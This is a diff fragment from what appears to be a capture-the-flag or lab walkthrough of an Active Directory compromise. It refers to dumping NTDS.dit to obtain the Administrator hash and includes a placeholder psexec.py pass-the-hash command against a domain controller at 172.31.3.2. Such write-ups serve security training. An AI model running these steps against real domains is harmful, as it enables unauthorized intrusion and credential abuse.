@@ -128,7 +128,7 @@ Lastly, we can dump the NTDS.dit hash file for the Administrator's hash using [s
 - 2. Get the Administrator's hash
 	![admin_hash.PNG](/images/office/SYSTEM/admin_hash.PNG)
 	
-- 3. PSExec 
+-  3. PSExec 
 	![psexec.PNG](/images/office/SYSTEM/psexec.PNG)
 	- python psexec.py (domain-name)/user@(domain-name) -hashes (admin-hash) -dc-ip 172.31.3.2 
 
